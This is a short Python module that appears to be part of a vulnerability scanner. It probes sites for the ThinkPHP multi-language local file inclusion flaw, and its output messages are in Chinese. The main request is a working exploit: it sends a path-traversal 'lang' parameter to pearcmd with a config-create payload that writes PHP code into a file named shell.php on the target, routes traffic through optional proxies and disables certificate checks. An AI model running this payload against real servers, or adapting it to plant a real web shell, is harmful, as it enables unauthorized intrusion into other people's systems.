import requests
import time
from bs4 import BeautifulSoup
import re
import logging

cf=''
g='[-]'
http = ''
https = ''
def dl10(dl):
    global http,https
    http=dl
    https=dl
def a(ca,s_cookie):
    global cf
    global g
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        aa = requests.get(ca+'?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+shell.php',cookies=s_cookie,proxies=proxies, verify=False,timeout=20)
        aa.encoding = 'utf-8'
        cd = BeautifulSoup(aa.text, 'html.parser')
        if 'CONFIGURATION'in cd.text:
            g='[+]'
            cf=str(cd)
        if g=='[-]':
            cf='[-]漏洞不存在'
        else:
            g='[-]'
    except EnvironmentError as aaa1:
        cf='[-]链接错误\n'+str(aaa1)
def jgi6():
    global cf
    return '--------------------------------------------------\n[ ThinkPHP 多语言本地文件包含漏洞 ]\n\n' + str(cf) + '\n'
def ui5(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)